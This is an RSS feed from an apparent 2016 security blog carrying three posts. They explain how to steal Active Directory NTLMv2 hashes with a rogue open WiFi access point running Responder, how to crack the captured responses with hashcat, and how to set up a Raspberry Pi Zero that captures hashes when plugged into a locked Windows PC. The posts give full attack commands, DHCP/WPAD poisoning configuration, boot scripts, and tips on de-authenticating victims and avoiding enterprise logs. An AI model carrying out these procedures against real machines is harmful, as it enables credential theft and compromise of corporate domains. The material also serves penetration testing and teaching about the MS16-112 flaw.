<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Zone13.io</title>
    <link>https://zone13.io/post/</link>
    <description>Recent content in Posts on Zone13.io</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <copyright>All rights reserved - 2016</copyright>
    <lastBuildDate>Mon, 03 Oct 2016 23:26:44 +0100</lastBuildDate>
    <atom:link href="https://zone13.io/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Snagging Active Directory credentials over WiFi - Part 1</title>
      <link>https://zone13.io/post/Snagging-credentials-over-WiFi-Part1/</link>
      <pubDate>Mon, 03 Oct 2016 23:26:44 +0100</pubDate>
      
      <guid>https://zone13.io/post/Snagging-credentials-over-WiFi-Part1/</guid>
      <description>

&lt;blockquote&gt;
&lt;p&gt;This issue has been fixed on Windows 8+ as part of MS16-112 issued in September 2016. I haven&amp;rsquo;t checked this on a Windows 7 machine which isn&amp;rsquo;t listed on the Microsoft page.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;basics&#34;&gt;Basics&lt;/h4&gt;

&lt;p&gt;The basic theory behind the attack is same as &lt;a href=&#34;https://twitter.com/mubix&#34;&gt;@mubix&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://room362.com/post/2016/snagging-creds-from-locked-machines/&#34;&gt;discovery&lt;/a&gt; - if you connect a network interface to a Windows system and have &lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;Responder tool&lt;/a&gt; poisoning the network, you can obtain the hashes (NTML responses) from the machine without any user intervention. This works even with the computer in &lt;strong&gt;locked state&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;In my scenario, I&amp;rsquo;m using a rogue Open WiFi network to grab the hashes. The result is the same and at times, I had better results than plugging in a &lt;a href=&#34;https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/&#34;&gt;Pi Zero&lt;/a&gt;. The Responder tool captures the hashes which can then be cracked using tools like &lt;a href=&#34;https://hashcat.net/hashcat/&#34;&gt;hashcat&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note: This only works with a domain joined computer. I haven&amp;rsquo;t seen a local account sending out hashes without user intervention.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;terminology&#34;&gt;Terminology:&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;LLMNR / NBT-NS poisoning&lt;/strong&gt; - I assume this is familiar by now. If not, there are a number of good resources that explain how the Responder tool uses this to capture hashes. &lt;a href=&#34;https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning&#34;&gt;Here&lt;/a&gt; is a good write-up from Stern Security.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Open WiFi network&lt;/strong&gt; - A WiFi network that allows clients to connect to it without needing any form of authentication and there is no channel encryption employed when the clients communicate. This includes public networks like Starbucks, Airport WiFi etc. which allows users to access internet either free or after paying a fee.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rogue WiFi access point&lt;/strong&gt; - An access point that masquerades as a legitimate access point by advertising the same SSID.&lt;/p&gt;

&lt;h4 id=&#34;attack-scenario&#34;&gt;Attack scenario&lt;/h4&gt;

&lt;p&gt;The catch about Open WiFi networks is that they allow clients to connect, get an IP over DHCP and share a common network with other clients. This means that an attacker waiting on the network can do things like ARP spoofing, Man-in-the-middle etc. to compromise the client. An attacker can always connect to a legitimate Open WiFi network and do poisoning attacks. However, in that case, the chances of him getting detected and logged are more. So, what are the options for an attacker?&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Create a rogue Open WiFi network and wait for the client to connect.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Why should the client connect to the rogue network anyway?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is the important bit. On Windows, when a user connects to a WiFi network for the first time, he is presented with an option to &amp;lsquo;remember&amp;rsquo; the network so that the machine connects to the WiFi network every time it is in vicinity. So if you bring up a rogue open WiFi network, the client connects to it automatically without any user intervention. Also, it is to be noted that there are no notification pop-ups when the client connects to the rogue network, possibly a way to ensure seamless connectivity in an ESS network.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/open_wifi.png&#34; alt=&#34;open_wifi&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So, why only Open WiFi networks for this attack?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A rogue Open access network can be created just by knowing the SSID of a legitimate network. This is unlike a WEP/WPA/WPA2 network which requires the attacker to know the WiFi passphrase in order to create a rogue network and make the client connect.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So you are telling me that the client must have connected to an Open WiFi access point. Why do you think anyone will connect a corporate laptop that is part of a Active Directory domain to an unsecure Open network?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Open WiFi networks are all around us. The whole point of enterprises distributing laptops is mobility. Users connect to various networks and establish a VPN connection back to the office network to access the resources. Imagine you are traveling for work. If you need internet access, one or the other time, you will most likely end up connecting to an Open WiFi network - like hotel WiFi, airport WiFi etc. Ask anyone who travels if you are still doubtful. :)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Ok, so if I travel and indeed connect to Open WiFi networks, how does the attacker know the SSID of the network I have connected to?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There are various ways for an attacker to find this:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Monitor the client probes from the client machines that queries for stored WiFi SSIDs&lt;/li&gt;
&lt;li&gt;Resources like &lt;a href=&#34;https://wigle.net&#34;&gt;Wigle.NET&lt;/a&gt; that serve as a database of SSIDs with locations. If needed, these SSID&amp;rsquo;s can be scripted to see which ones elicits a response from client machines&lt;/li&gt;
&lt;li&gt;Google !! - basic recon stuff - search for the Hotel WiFi network name where the person has stayed (e.g. &lt;strong&gt;Marriott_Guest&lt;/strong&gt;)&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;setup&#34;&gt;Setup&lt;/h4&gt;

&lt;h5 id=&#34;rogue-open-wifi-network&#34;&gt;Rogue Open WiFi network&lt;/h5&gt;

&lt;p&gt;Rogue APs can be of two types:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Software based - E.g. Hostapd, Airbase-ng&lt;/li&gt;
&lt;li&gt;Hardware based - E.g. Actual WiFi routers, &lt;a href=&#34;https://www.wifipineapple.com/&#34;&gt;WiFi Pineapple&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;I have seen that WiFi Pineapple has a Responder &lt;a href=&#34;https://www.wifipineapple.com/modules&#34;&gt;module&lt;/a&gt;, but I haven&amp;rsquo;t tried it yet. I will leave it for another post.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I decided to go with an actual hardware WiFi router, the &lt;a href=&#34;http://www.tp-link.com/lk/products/details/cat-14_TL-MR3020.html&#34;&gt;TP-LINK MR3020&lt;/a&gt; for the following reasons:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;WiFi clients are getting smarter and they are able to detect and prevent connecting to software based APs. This can be bypassed using an actual WiFi router to which the clients connect willingly.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;MR3020 is a wonderful device that can be powered using a battery pack allowing you to even do a &amp;lsquo;wardriving&amp;rsquo; exercise.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;It has an &lt;a href=&#34;https://wiki.openwrt.org/toh/tp-link/tl-mr3020&#34;&gt;OpenWrt&lt;/a&gt; firmware with more options. However, I have used the factory firmware in this case.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;â€‹&lt;/p&gt;

&lt;h5 id=&#34;a-linux-machine-to-run-responder&#34;&gt;A Linux machine to run Responder&lt;/h5&gt;

&lt;p&gt;I used a Raspberry Pi 3 running Raspbian (referred to as RPi here on).&lt;/p&gt;

&lt;h5 id=&#34;an-ssh-client-to-remote-into-rpi-and-view-the-live-capture&#34;&gt;An SSH client to remote into RPi and view the live capture&lt;/h5&gt;

&lt;p&gt;I connected my laptop to the rogue WiFi and SSH&amp;rsquo;ed into RPi.&lt;/p&gt;

&lt;h4 id=&#34;execution&#34;&gt;Execution&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Step1:&lt;/strong&gt; Clone the Responder tool from &lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;GitHub repo&lt;/a&gt; on to the RPi.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt; Configure the MR3020 using the SSID (&lt;strong&gt;Z13_guest_wifi&lt;/strong&gt; in my case) of the Open WiFi network that the user has connected to in the past. Additionally, set the DNS server under DHCP options to the IP of the RPi so that we get all the DNS queries. The RPi can be given a static IP every time by doing an address reservation. Toggle the hardware switch to 3G/4G so that the RPi can be plugged into it&amp;rsquo;s LAN port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/MR3020_open_wifi_config.png&#34; alt=&#34;MR3020_open_wifi_config&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/mr3020_dns_server.png&#34; alt=&#34;mr3020_dns_server&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 3:&lt;/strong&gt; Connect the RPi to MR3020 and power on both devices. The RPi boots up and gets an IP from the MR3020.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 4:&lt;/strong&gt; Connect to the rogue WiFi network and SSH into RPi. Run the Responder tool.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;./Responder.py -I eth0 -f -w -r -d -F&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/run_responder.png&#34; alt=&#34;run_responder&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 5:&lt;/strong&gt; Wait until the client connects to our rogue WiFi network. This can be done in a couple of ways:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Wait until the client connects by virtue of higher signal strength&lt;/li&gt;
&lt;li&gt;De-auth the client from the legitimate network and connect to the rogue AP&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Once the client connects, the Responder tool does its magic and captures the hashes. It was observed that &lt;em&gt;if the client was made to re-connect to the rogue network, the hash was captured much quickly&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/hash_captured.png&#34; alt=&#34;hash_captured&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The captured hashes can then be cracked using tools like hashcat.&lt;/p&gt;

&lt;h4 id=&#34;advantages&#34;&gt;Advantages&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;No physical access to the system required, only WiFi proximity is needed&lt;/li&gt;
&lt;li&gt;Plugging in USB devices like LAN Turtle can be disabled using AD policies. This attack vector has an edge in that case&lt;/li&gt;
&lt;li&gt;No driver installation required - use of Pi Zero for mubix&amp;rsquo;s attack required the driver to be pre-installed on the target system.&lt;/li&gt;
&lt;li&gt;No logs recorded on the enterprise logging systems. The only place where this gets logged is Windows Event Viewer&lt;/li&gt;
&lt;li&gt;Less chances of discovering that the hashes were grabbed. This gives an attacker ample time to crack the hash on his cracking rig.&lt;/li&gt;
&lt;li&gt;Ability to do a wardriving exercise to capture hashes from multiple machines which has connected to the same Open WiFi network.&lt;/li&gt;
&lt;li&gt;The hash was observed to be captured quite quickly (often less than 30 seconds).&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h4&gt;

&lt;p&gt;This attack scenario can compromise the enterprise&amp;rsquo;s AD domain without even touching the on premise network (wired or wireless). The only info that an attacker needs is the  SSID of &amp;lsquo;&lt;strong&gt;any one&lt;/strong&gt;&amp;rsquo; Open WiFi network that the user has connected to in the past with &amp;lsquo;Connect automatically&amp;rsquo; option enabled. From a network admin perspective, this can be a nightmare. Of course, the success of obtaining the plaintext credentials depend on whether the NTLM hash can be cracked. With ever increasing computational power and plaintext passwords getting dumped every now and then from various sources, the chances of cracking the passwords are quite good.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Cracking NTLMv2 responses captured using responder</title>
      <link>https://zone13.io/post/cracking-ntlmv2-responses-captured-using-responder/</link>
      <pubDate>Fri, 23 Sep 2016 19:55:06 +0100</pubDate>
      
      <guid>https://zone13.io/post/cracking-ntlmv2-responses-captured-using-responder/</guid>
      <description>

&lt;p&gt;In the previous &lt;a href=&#34;https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/&#34;&gt;post&lt;/a&gt;, a Raspberry Pi Zero was modified to capture hashes (or rather NTLMv2 responses from the client).&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s see how &lt;a href=&#34;https://hashcat.net/hashcat/&#34;&gt;hashcat&lt;/a&gt; can be used to crack these responses to obtain the user password. I will be using dictionary based cracking for this exercise on a Windows system.&lt;/p&gt;

&lt;h3 id=&#34;setup&#34;&gt;Setup&lt;/h3&gt;

&lt;p&gt;Download the latest version of hashcat binaries from &lt;a href=&#34;https://hashcat.net/hashcat/&#34;&gt;here&lt;/a&gt; - v3.10 at the time of writing.&lt;/p&gt;

&lt;p&gt;Unzip the 7z file and open a command prompt at the unzipped location.&lt;/p&gt;

&lt;p&gt;For convenience, I have created two directories in the hashcat folder:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;hashes&lt;/strong&gt; - to store the responses that need to be cracked&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;cracked&lt;/strong&gt; - to store the cracked passwords&lt;/p&gt;

&lt;h3 id=&#34;captured-responses&#34;&gt;Captured responses&lt;/h3&gt;

&lt;p&gt;The client response captured by Responder was:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[HTTP] NTLMv2 Client   : 192.168.154.131
[HTTP] NTLMv2 Username : MANGO\neo
[HTTP] NTLMv2 Hash     : neo
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;where,&lt;/p&gt;

&lt;p&gt;MANGO is my domain name and neo is the user who was logged into the system.&lt;/p&gt;

&lt;p&gt;I saved the response into a text file named &lt;strong&gt;hash.txt&lt;/strong&gt; in the &lt;strong&gt;hashes&lt;/strong&gt; folder created earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/hash.png&#34; alt=&#34;hash&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;cracking-using-hashcat&#34;&gt;Cracking using hashcat&lt;/h3&gt;

&lt;p&gt;The hashcat developers have done a wonderful job in simplifying the cracking process. All you need is a fast  cracking machine and patience. :)&lt;/p&gt;

&lt;p&gt;Since this is a dictionary based cracking, there are two scenarios here:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Your password list does not contain the user password&lt;/li&gt;
&lt;li&gt;Your password list has the user password&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I wanted to show both scenarios here, starting with the worst case - not having the password in the list.&lt;/p&gt;

&lt;p&gt;For the sake of the the demo, I extracted a subset of the passwords from example.dict that comes with hashcat and saved it as &lt;strong&gt;password_list.txt&lt;/strong&gt; in the hashcat folder. For the first run, the &lt;strong&gt;password_list.txt&lt;/strong&gt; does not have the user password.&lt;/p&gt;

&lt;p&gt;Open a command prompt at the extracted hashcat folder. For NTLMv2 cracking, the hashcat can be run as,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;hashcat64.exe -m 5600 hashes\hash.txt password_list.txt -o cracked\cracked.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
&lt;p&gt;If you don&amp;rsquo;t specify -o switch, the password (if cracked) will be stored in &lt;strong&gt;hashcat.pot&lt;/strong&gt; file in the hashcat folder.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If the password is not found, this is what you see once hashcat completes the cracking.&lt;/p&gt;

&lt;p&gt;Status: &lt;strong&gt;Exhausted&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/password_not_found.png&#34; alt=&#34;password_not_found&#34; /&gt;&lt;/p&gt;

&lt;p&gt;For the next run, the case if I have the user password in my password list. I edited the password_list.txt and appended the user password (I created the user, remember :)).&lt;/p&gt;

&lt;p&gt;Running the hashcat tool again,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;hashcat64.exe -m 5600 hashes\hash.txt password_list.txt -o cracked\cracked.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Status: &lt;strong&gt;Cracked&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/password_found.png&#34; alt=&#34;password_found&#34; /&gt;&lt;/p&gt;

&lt;p&gt;To view the cracked password, see the &lt;strong&gt;cracked.txt&lt;/strong&gt; file in the folder named &lt;strong&gt;cracked&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/cracked_out.png&#34; alt=&#34;cracked_out&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The success of cracking the password using this method solely depends on whether or not your password list is good enough.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Raspberry Pi Zero for credential snagging</title>
      <link>https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/</link>
      <pubDate>Sun, 18 Sep 2016 12:13:05 +0100</pubDate>
      
      <guid>https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/</guid>
      <description>

&lt;blockquote&gt;
&lt;p&gt;Update: &lt;strong&gt;CVE-2016-3302&lt;/strong&gt; / &lt;strong&gt;MS16-112&lt;/strong&gt; patch was released by Microsoft to fix the issue.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;This post is an extension to Rob Fuller&amp;rsquo;s (@mubix) work - &lt;a href=&#34;https://room362.com/post/2016/snagging-creds-from-locked-machines/&#34;&gt;https://room362.com/post/2016/snagging-creds-from-locked-machines/&lt;/a&gt; to see how a Raspberry Pi Zero can be used for credential snagging. All credits go to @mubix for the original research. It is recommended to read mubix&amp;rsquo;s post (if you haven&amp;rsquo;t already !) before proceeding.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pizero.jpeg&#34; alt=&#34;&#34; style=&#34;width:600px&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h3&gt;

&lt;h4 id=&#34;software&#34;&gt;Software&lt;/h4&gt;

&lt;p&gt;This will &lt;strong&gt;only&lt;/strong&gt; work if the target Windows system has &lt;a href=&#34;https://en.wikipedia.org/wiki/RNDIS&#34;&gt;RNDIS&lt;/a&gt; drivers installed. The driver doesn&amp;rsquo;t seem to install automatically (like when you plug in a new mouse or any USB accessory) and has to be installed manually as explained &lt;a href=&#34;https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking&#34;&gt;here&lt;/a&gt; after booting up the Pi Zero for the first time.&lt;/p&gt;

&lt;h4 id=&#34;hardware&#34;&gt;Hardware&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;Raspberry Pi Zero (I have v1.3)&lt;/li&gt;
&lt;li&gt;Micro SD card (4GB or more) with &lt;a href=&#34;https://www.raspberrypi.org/downloads/raspbian/&#34;&gt;Raspbian Jessie&lt;/a&gt; (I used Jessie Lite, Release date: 2016-05-27)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Micro USB cable (any cable that supports data transfer - try those coming with mobiles)&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;procedure&#34;&gt;Procedure&lt;/h3&gt;

&lt;p&gt;I&amp;rsquo;m setting up the Pi Zero from my Windows machine (Windows 8.1). If you are working from a different OS, adopt any changes as necessary (Google is your best friend :)).&lt;/p&gt;

&lt;p&gt;I assume that you have already installed the Raspbian Jessie Lite OS on the Micro SD card. On Windows, I prefer to use the &lt;a href=&#34;https://sourceforge.net/projects/win32diskimager/&#34;&gt;Win32DiskImager&lt;/a&gt;. If you are not familiar with the OS flashing process, refer &lt;a href=&#34;https://www.raspberrypi.org/documentation/installation/installing-images/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;pi-zero-usb-gadget-setup&#34;&gt;Pi Zero USB gadget setup&lt;/h4&gt;

&lt;p&gt;Insert the Micro SD card with Raspbian OS into a suitable card reader and plug it into the Windows system. Open the boot partition in Windows explorer.&lt;/p&gt;

&lt;p&gt;Two files need to be edited here:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;config.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Append the following on a new line:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dtoverlay=dwc2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The resulting file looks like &lt;a href=&#34;https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/config.txt&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;cmdline.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Insert the following after &lt;strong&gt;rootwait&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;modules-load=dwc2,g_ether
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Be careful with the formatting on this one, the values are separated by spaces.&lt;/p&gt;

&lt;p&gt;The resulting file looks like &lt;a href=&#34;https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/cmdline.txt&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Once both the files are edited and saved, eject the Micro SD card and insert into the Pi Zero slot. Connect the Pi Zero to the Windows system using the Micro USB cable.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note: The cable has to be connected to the Micro USB port of Pi Zero to be used as a USB gadget.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;pi-zero-packages-setup&#34;&gt;Pi Zero packages setup&lt;/h4&gt;

&lt;p&gt;If the Pi Zero is not detected by Windows system after booting up, it means that RNDIS drivers are not installed. The drivers can be installed by following the procedure &lt;a href=&#34;https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Once the RNDIS devices are installed, the new USB Ethernet will be visible under &lt;strong&gt;Network Connections&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/net_conns_adapter.png&#34; alt=&#34;net_conns_adapter&#34; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note: I have renamed my adapter as &lt;strong&gt;PiZero&lt;/strong&gt; and hence displayed above.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There are a number of packages that need to be installed on the Pi Zero to be used a credential snagging device. For this to happen, the Pi Zero will need Internet access.&lt;/p&gt;

&lt;p&gt;I decided to share my LAN Internet with Pi Zero for this purpose. You can do the same or even share your Wi-Fi Internet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/share_internet.png&#34; alt=&#34;share_internet&#34; /&gt;&lt;/p&gt;

&lt;p&gt;At this stage you should be able to ping Pi Zero (hostname: &lt;em&gt;raspberrypi.local&lt;/em&gt;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/ping_pizero_local.png&#34; alt=&#34;ping_pizero_local&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now, you can SSH to Pi Zero using the hostname.&lt;/p&gt;

&lt;p&gt;The default credentials are:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;username: pi&lt;/p&gt;

&lt;p&gt;password: raspberry&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/putty_settings.png&#34; alt=&#34;putty_settings&#34; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, it is a good idea to check Internet connectivity for the Pi Zero (e.g. try pinging google.com). If the ping can resolve to IP (not getting a ping response is alright), you are good to go. If there is some connectivity error, try running:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo dhclient usb0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, proceed with running the below commands in order:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo apt-get update
sudo apt-get install -y python git python-pip python-dev screen sqlite3 isc-dhcp-server python-crypto inotify-tools

sudo mkdir tools
cd tools
sudo git clone https://github.com/lgandx/Responder.git
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;configure-a-static-ip&#34;&gt;Configure a static IP&lt;/h4&gt;

&lt;p&gt;Open /etc/network/interfaces&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /etc/network/interfaces
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code at the end of the file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;auto usb0
allow-hotplug usb0
iface usb0 inet static
  address 192.168.2.201
  netmask 255.255.255.0
  gateway 192.168.2.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/etc_interfaces.png&#34; alt=&#34;etc_interfaces&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;dhcp-server-setup&#34;&gt;DHCP server setup&lt;/h4&gt;

&lt;p&gt;Backup the existing config file and create a new one for our setup&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bkp
sudo nano /etc/dhcp/dhcpd.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ddns-update-style none;

option domain-name &amp;quot;domain.local&amp;quot;;
option domain-name-servers 192.168.2.201;

default-lease-time 60;
max-lease-time 72;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# A slightly different configuration for an internal subnet.
subnet 192.168.2.0 netmask 255.255.255.0 {
  range 192.168.2.1 192.168.2.2;
  option routers 192.168.2.201;
  option local-proxy-config &amp;quot;http://192.168.2.201/wpad.dat&amp;quot;;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;run-scripts-at-boot&#34;&gt;Run scripts at boot&lt;/h4&gt;

&lt;p&gt;Open the /etc/rc.local file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /etc/rc.local
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code before &lt;strong&gt;exit 0&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Clear leases
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

# Start DHCP server
/usr/sbin/dhcpd

# Start Responder
/usr/bin/screen -dmS responder bash -c &#39;cd /home/pi/tools/responder/; python Responder.py -I usb0 -f -w -r -d -F&#39;

# Monitor Responder.db and shutdown once the hashes are captured
echo &amp;quot;Staring cred watch&amp;quot; &amp;gt;&amp;gt; /root/rc.log
/usr/bin/screen -dmS notify bash -c &#39;while inotifywait -e modify /home/pi/tools/responder/Responder.db; do shutdown -h now; done&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;create-logs-for-screen-sessions&#34;&gt;Create logs for screen sessions&lt;/h4&gt;

&lt;p&gt;Create a &lt;strong&gt;logs&lt;/strong&gt; folder:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo mkdir /root/logs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Add a .screenrc file&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /root/.screenrc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code in .screenrc file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That concludes the setup.&lt;/p&gt;

&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Try plugging in the Pi Zero to a locked Windows PC and wait. If all goes well, the Responder.db file will be created at &lt;strong&gt;/home/pi/tools/responder/&lt;/strong&gt; and hashes will be stored.&lt;/p&gt;

&lt;p&gt;The captured hashes can be viewed using &lt;strong&gt;sqlite3&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sqlite3 /home/pi/tools/responder/Responder.db
select * from responder;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/sqlite3_out.png&#34; alt=&#34;sqlite3_out&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Python code to retrieve the latest tweet from a user</title>
      <link>https://zone13.io/post/python-code-latest-tweet/</link>
      <pubDate>Sat, 17 Sep 2016 15:25:24 +0100</pubDate>
      
      <guid>https://zone13.io/post/python-code-latest-tweet/</guid>
